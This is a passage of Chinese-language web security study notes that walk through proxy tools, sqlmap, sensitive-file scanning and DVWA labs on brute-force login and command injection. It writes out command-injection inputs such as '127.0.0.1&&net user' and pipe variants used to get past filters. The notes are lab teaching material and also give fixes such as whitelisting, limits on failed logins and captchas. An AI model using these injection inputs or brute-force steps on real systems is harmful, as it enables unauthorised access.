+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738261499.png" alt="1569738261499"></p>
+<ul>
+<li>必备条件：<ul>
+<li>可以控制输入的数据</li>
+<li>服务器要执行的代码拼接了控制的数据</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738396126.png" alt="1569738396126"></p>
+<p>SQL注入的<strong>本质</strong>：数据和代码未分离，即数据当做了代码来执行</p>
+<p>危害：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738551128.png" alt="1569738551128"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738565272.png" alt="1569738565272"></p>
+<h1 id="3-Web安全工具"><a href="#3-Web安全工具" class="headerlink" title="3 Web安全工具"></a>3 Web安全工具</h1><h2 id="1-浏览器和浏览器拓展初级"><a href="#1-浏览器和浏览器拓展初级" class="headerlink" title="1 浏览器和浏览器拓展初级"></a>1 浏览器和浏览器拓展初级</h2><h3 id="1-安全测试之浏览器入门"><a href="#1-安全测试之浏览器入门" class="headerlink" title="1 安全测试之浏览器入门"></a>1 安全测试之浏览器入门</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569741893168.png" alt="1569741893168"></p>
+<p>hackbar基本功能介绍</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569742115066.png" alt="1569742115066"></p>
+<p>编辑cookie类插件为firebug浏览器提供快速修改、增加、删除cookie的功能</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569744284170.png" alt="1569744284170"></p>
+<p>proxy switcher的用法结合抓包工具更好</p>
+<p>学会清理缓存，第二个还可以采用隐身模式</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569746320921.png" alt="1569746320921"></p>
+<h2 id="2-代理抓包分析工具"><a href="#2-代理抓包分析工具" class="headerlink" title="2 代理抓包分析工具"></a>2 代理抓包分析工具</h2><p><strong>代理工作原理</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747039370.png" alt="1569747039370"></p>
+<p><strong>浏览器代理设置</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747175452.png" alt="1569747175452"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747244758.png" alt="1569747244758"></p>
+<p>设置过程偏繁琐 ===》proxy switcher</p>
+<p>界面</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747328239.png" alt="1569747328239"></p>
+<p>设置</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747357777.png" alt="1569747357777"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749176245.png" alt="1569749176245"></p>
+<p><strong>常用HTTP代理工具</strong></p>
+<ul>
+<li>Burpsuite</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749423351.png" alt="1569749423351"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749454630.png" alt="1569749454630"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749471180.png" alt="1569749471180"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749545731.png" alt="1569749545731"></p>
+<ul>
+<li>Charles</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749560706.png" alt="1569749560706"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749574749.png" alt="1569749574749"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749598954.png" alt="1569749598954"></p>
+<ul>
+<li>Fiddler</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749614434.png" alt="1569749614434"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749632951.png" alt="1569749632951"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569749647235.png" alt="1569749647235"></p>
+<h2 id="3-Web漏洞扫描工具初级"><a href="#3-Web漏洞扫描工具初级" class="headerlink" title="3 Web漏洞扫描工具初级"></a>3 Web漏洞扫描工具初级</h2><h3 id="1-敏感文件探测"><a href="#1-敏感文件探测" class="headerlink" title="1 敏感文件探测"></a>1 敏感文件探测</h3><p><strong>什么是敏感文件？</strong></p>
+<p>​        敏感文件对于网站来说，就像是网站（网站管理员）的秘密日记，这个文件如果没有保护好，被访问者发现了，就有可能暴露站点的脆弱性或保密数据</p>
+<p><strong>常见的“敏感文件”类型</strong></p>
+<ul>
+<li><p>网站管理后台</p>
+</li>
+<li><p>数据文件</p>
+</li>
+<li><p>备份文件</p>
+</li>
+<li><p>Webshell</p>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569755345599.png" alt="1569755345599"></p>
+<p><strong>敏感文件探测原理</strong></p>
+<p>​         猜测文件名，然后根据返回的HTTP状态码判断文件是否存在</p>
+<ul>
+<li>200：文件存在</li>
+<li>301：跳转</li>
+<li>404：文件不存在</li>
+</ul>
+<p>详情：HTTP状态码详解</p>
+<p><a target="_blank" rel="noopener" href="http://tool.oschina.net/commons?type=5">http://tool.oschina.net/commons?type=5</a></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569757792815.png" alt="1569757792815"></p>
+<p>第一次扫描</p>
+<p><strong>目标站点</strong>：    <code>http://testasp.vulnweb.com   和  http://testphp.vulnweb.com</code></p>
+<p>字典选择（参考）：<code>ASP.txt  DIR.txt、MDB.txt、PHP.txt</code></p>
+<p>改进思路：</p>
+<p>首先思考：字典越大越好吗？   ===&gt;将字典分类存好，如php、sap等等</p>
+<p><strong>问题1：</strong>PHP的站点用ASP的字典去扫描不是在做无用功吗？</p>
+<p>如何判断常见网站脚本类型？（ASP/PHP/ASPX/JSP等）</p>
+<p><strong>一个简单的方法：</strong>判断index的文件类型</p>
+<p><strong>查看</strong>：index.asp     |    index.php    |    index.aspx    |    index.jsp等是否存在</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569758678976.png" alt="1569758678976"></p>
+<p><strong>问题2</strong>:每个网站都有所不同，通用的字典针对性差，命中率低</p>
+<p>如何生成针对性字典？</p>
+<p>举例说明：以构造针对性的备份文件字典为例</p>
+<p>目标站点：<code>http://textphp.vulnweb.com</code></p>
+<p>可能存在的备份文件名：testphpvulnwebcom.rar    |    vulnweb.com.rar    |    TESTPHP.VULNWEB.COM.rar    …….</p>
+<p>分享一个Python小程序：根据URL生成目标备份文件猜测字典</p>
+<p><strong>任务</strong>：阅读Python源代码，思考字典生成思路</p>
+<h3 id="2-漏洞扫描工具入门"><a href="#2-漏洞扫描工具入门" class="headerlink" title="2 漏洞扫描工具入门"></a>2 漏洞扫描工具入门</h3><p>AWVS    |    Netsparker    |    AppScan</p>
+<p>一款优秀的漏洞扫描器是一批安全专家将自己基类的’测试手法’和’测试经验’自动化的产物，是宝贵的只会结晶</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569773534024.png" alt="1569773534024"></p>
+<p>问题1：使用漏扫工具需要明确的问题</p>
+<p>​        对目标站点的误伤：如高流量、请求了危险功能（如删除数据库）</p>
+<p>问题2：漏洞评级问题</p>
+<pre><code> 技术角度    +     业务角度</code></pre>
+<p>问题3：漏扫结果的解读和运用</p>
+<ol>
+<li>测试用例可能需要调整</li>
+<li>误报和漏报</li>
+<li>将扫描结果作为人工测试的线索</li>
+</ol>
+<h3 id="3-SQL注入漏洞测试入门"><a href="#3-SQL注入漏洞测试入门" class="headerlink" title="3  SQL注入漏洞测试入门"></a>3  SQL注入漏洞测试入门</h3><ul>
+<li><p>SQL注入的成因是因为服务器要<strong>执行的数据库代码拼接了用户输入的数据</strong></p>
+</li>
+<li><p>SQL注入漏洞的典型危害是可以被用来<strong>获取数据库敏感数据（拖库）</strong></p>
+</li>
+</ul>
+<p>命令行工具：</p>
+<ul>
+<li>只需关注输入和输出</li>
+<li>看到流程化的执行细节</li>
+</ul>
+<p>sqlmap是一款开源的SQL<strong>注入</strong>漏洞<strong>检测</strong>与<strong>利用</strong>神器</p>
+<p><strong>发现和利用SQL注入漏洞基本流程</strong></p>
+<ul>
+<li>找到有数据库交互的功能页面</li>
+<li>判断页面是否存在SQL注入</li>
+<li>利用SQL注入漏洞读取数据</li>
+<li>导出所需数据保存</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569906960437.png" alt="1569906960437"></p>
+<p><strong>小技巧：</strong>字母缩写前一个-，完整单词是两个–</p>
+<p><code>python2 sqlmap.py -u &quot;http://xxx&quot;</code>   (双引号可以加也可以不加)</p>
+<p>注意：实际环境中，确定注入点以及基本的信息就可以了</p>
+<p>注入尝试：GET、 POST</p>
+<p>了解：level和risk参数的作用</p>
+<h3 id="4-在线工具使用"><a href="#4-在线工具使用" class="headerlink" title="4 在线工具使用"></a>4 在线工具使用</h3><p><strong>海量数据如何找到</strong></p>
+<ul>
+<li>搜索引擎语法</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569921272902.png" alt="1569921272902"></p>
+<p>google hack技术：指用google等搜索引擎对某些特定的网络主机漏洞（通常是服务器上的漏洞脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的</p>
+<p>各种语法自行百度</p>
+<ul>
+<li>网络空间搜索：shodan、zoomey 、fofa</li>
+</ul>
+<p>找到他们的用户手册，进行实际练习</p>
+<p>基本原理：探测/爬取   —-&gt;   识别/打标签  —–&gt;  存储共检索</p>
+<ul>
+<li>在web工具：whatweb.net/<a target="_blank" rel="noopener" href="http://www.ipip.net/www.cmd5.com/tool.chinaz.com">www.ipip.net/www.cmd5.com/tool.chinaz.com</a></li>
+</ul>
+<h1 id="4-web安全实践"><a href="#4-web安全实践" class="headerlink" title="4 web安全实践"></a>4 web安全实践</h1><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569930602302.png" alt="1569930602302"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569930628060.png" alt="1569930628060"></p>
+<p>dvwa和dsvw系统</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569930729089.png" alt="1569930729089"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569930980916.png" alt="1569930980916"></p>
+<p>误区：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931076179.png" alt="1569931076179"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931095277.png" alt="1569931095277"></p>
+<p>示例：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931504754.png" alt="1569931504754"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931517881.png" alt="1569931517881"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569931547980.png" alt="1569931547980"></p>
+<h2 id="1-DVWA部署"><a href="#1-DVWA部署" class="headerlink" title="1 DVWA部署"></a>1 DVWA部署</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006086457.png" alt="1570006086457"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006272662.png" alt="1570006272662"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006299028.png" alt="1570006299028"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006314933.png" alt="1570006314933"></p>
+<p>渗透测试神器：</p>
+<ul>
+<li>firebug</li>
+<li>Hackbar</li>
+<li>Tamper Data</li>
+<li>Proxy Switcher</li>
+</ul>
+<p>部署web服务器环境</p>
+<ul>
+<li>XAMPP</li>
+</ul>
+<p>部署Web 渗透测试环境</p>
+<ul>
+<li>DVWA</li>
+</ul>
+<h2 id="2-暴力破解"><a href="#2-暴力破解" class="headerlink" title="2 暴力破解"></a>2 暴力破解</h2><p>行李箱的破解</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570006984474.png" alt="1570006984474"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007016016.png" alt="1570007016016"></p>
+<p><strong>owasp zap</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007374782.png" alt="1570007374782"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007405634.png" alt="1570007405634"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007533265.png" alt="1570007533265"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007579749.png" alt="1570007579749"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007608420.png" alt="1570007608420"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007638522.png" alt="1570007638522"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570007705834.png" alt="1570007705834"></p>
+<p>此时这个数据报是什么样子的呢？</p>
+<p>使用owasp，实战操作</p>
+<ul>
+<li>firebug代理设置</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570072960353.png" alt="1570072960353"></p>
+<ul>
+<li>ZAP代理设置</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570072995702.png" alt="1570072995702"></p>
+<ul>
+<li>抓包</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570074171472.png" alt="1570074171472"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570080377466.png" alt="1570080377466"></p>
+<p>自己的实际情况：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570087449266.png" alt="1570087449266"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570087688279.png" alt="1570087688279"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088180579.png" alt="1570088180579"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088196245.png" alt="1570088196245">     </p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088342455.png" alt="1570088342455"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088423869.png" alt="1570088423869"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570090575987.png" alt="1570090575987"></p>
+<p>于是我们设置好了<code>usename</code>字典</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088776053.png" alt="1570088776053"></p>
+<p>于是我们设置好了 <code>password</code>字典</p>
+<p>接下来就是暴力破解</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570088922565.png" alt="1570088922565"></p>
+<p>输出结果</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570090662135.png" alt="1570090662135"></p>
+<p>这里我们使用的DVWA Security是低等级（ms时间单位），如果是中等（s时间单位）的话，也可以破解出来，唯一的区别在于时间变长了 。通过查看源代码发现，每次登陆失败都会<code>sleep(2)</code>，即暂停两秒，增加了破解的时间成本</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570089630597.png" alt="1570089630597"></p>
+<p>抓包发现每次登陆参数user_token都是动态改变且不可预测的随机字符串</p>
+<p><strong>思考</strong>：user_token是从哪里来的？</p>
+<p>回答：<strong>下一次的user_token会在上一次的响应包里返回给浏览器</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091006396.png" alt="1570091006396"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091042929.png" alt="1570091042929"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091092240.png" alt="1570091092240"></p>
+<p>针对这样的情况我们能不能攻破呢？答案是肯定的，我门需要重新设计<strong>破解动作</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091214455.png" alt="1570091214455"></p>
+<p><strong>破解动作：</strong>访问首页——获得usertoken参数——发送带usertoken的登录数据包</p>
+<p>写下破解的伪代码</p>
+<p>###<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570091607329.png" alt="1570091607329"></p>
+<p>在运行脚本前需要修改自己的本地ip地址和自己登录的PHPSESSID</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570092769125.png" alt="1570092769125"></p>
+<ul>
+<li>限制错误登录次数</li>
+<li>验证码</li>
+</ul>
+<h2 id="3-命令注入"><a href="#3-命令注入" class="headerlink" title="3 命令注入"></a>3 命令注入</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570093193386.png" alt="1570093193386"></p>
+<ul>
+<li>命令：指<strong>操作系统命令</strong></li>
+<li>注入：通过Web程序<strong>在服务器上</strong>拼接系统命令</li>
+</ul>
+<h3 id="实战："><a href="#实战：" class="headerlink" title="实战："></a><strong>实战</strong>：</h3><p>工具：firebug  和  DVWA</p>
+<p>步骤：</p>
+<ol>
+<li>输入用户名“admin”，密码“password”，成功登录</li>
+<li>进入DVWA Security，Security Level选择Low</li>
+<li>进入Command Injection，是命令执行的主页面</li>
+</ol>
+<p>正常操作：输入IP地址——点击提交——显示结果</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094277544.png" alt="1570094277544"></p>
+<p>如果结果显示是乱码，请这样做：</p>
+<p><strong>在 …/DVWA/dvwa/includes目录下，有个dvwaPage.inc.php文件，打开文件在277行修改，将UTF-8改为GBK或者GB2312即可</strong></p>
+<p>有没有觉得上面的结果和cmd下<strong>ping</strong>的结果很类似，其实就是它</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094341869.png" alt="1570094341869"></p>
+<p>所以web程序调用了我们的系统命令</p>
+<p><strong>命令注册流程</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094387800.png" alt="1570094387800"></p>
+<ul>
+<li><strong>确认可控字段：</strong></li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094433914.png" alt="1570094433914"></p>
+<ul>
+<li><strong>确定命令语句</strong>：windows下如何连接两条命令，例如 <code>ping 127.0.0.1和net user</code>，方法是使用<code>&amp;&amp;</code>符号</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094563877.png" alt="1570094563877"></p>
+<p>①操作一下：（记得将 DVWA Security设置为<strong>Low level</strong>）</p>
+<p>在输入栏中输入：127.0.0.1&amp;&amp;net user</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094882552.png" alt="1570094882552"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570094675271.png" alt="1570094675271"></p>
+<p>有一个错误的发生</p>
+<p>②将 DVWA Security设置为<strong>中等</strong>，看看结果：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570095039384.png" alt="1570095039384"></p>
+<p>命令执行出错，猜测<code>&amp;&amp;</code>符号被<strong>过滤</strong>了</p>
+<p><strong>思考</strong>如何去解决，windows下是不是还有其他的符号连接两个命令呢？</p>
+<p>回答：一个<code>&amp;</code>也可以的</p>
+<p>so，我们在中等安全等级下尝试下，是成功的</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570095206885.png" alt="1570095206885"></p>
+<p>③我们将等级设置为高级的，发现是失败的，使用’&amp;&amp;’也是失败的</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570095324103.png" alt="1570095324103"></p>
+<p><strong>思考</strong>：还有没第三个连接符</p>
+<p><strong>回答</strong>：管道命令符<code>|</code>,就是将上一条命令传递给下一个命令</p>
+<p>结果：ping命令没有显示，只显示了<code>net user</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570095456829.png" alt="1570095456829"></p>
+<p>④将安全等级设置为<code>impossible</code>，结果是：<strong>有效地防止了命令注入</strong></p>
+<p>可以<code>ping</code>通127.0.0.1，但是之前提到的那些连接符的命令都是失败的</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570096317089.png" alt="1570096317089"></p>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>使用白名单，而不是黑名单</p>
+<p>因为如果过滤了敏感命令怎么办？</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101503640.png" alt="1570101503640"></p>
+<p>通常来说，命令注入都是有回显的，如果没有该怎么办呢？</p>
+<p><strong>解决：</strong></p>
+<ol>
+<li>延时注入</li>
+<li>远程请求</li>
+</ol>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101690138.png" alt="1570101690138"></p>
+<ul>
+<li>区分<code>&amp;,&amp;&amp;,|,||</code>:</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570100546558.png" alt="1570100546558"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101050646.png" alt="1570101050646"></p>
+<h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4 CSRF"></a>4 CSRF</h2><p>举例</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101829770.png" alt="1570101829770"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570101868786.png" alt="1570101868786"></p>
+<p>受害者角度：用户在当前已登录的web应用程序上执行<strong>非本意</strong>的操作</p>
+<p>攻击者角度：攻击者欺骗浏览器，让其<strong>以受害者的名义</strong>执行自己想要对操作</p>
+<p>工具：firebug    |    DVWA    |    Tamper Data    |    Hackbar</p>
+<p>步骤：</p>
+<ol>
+<li>输入用户名和密码，成功登录</li>
+<li>进入DVWA Security，Security Level选择Low</li>
+<li>进入CSRF，是CSRF攻击的主页面，是常见的修改密码功能</li>
+</ol>
+<p>正常操作：新密码——确认新密码——点击提交——重新登录验证</p>
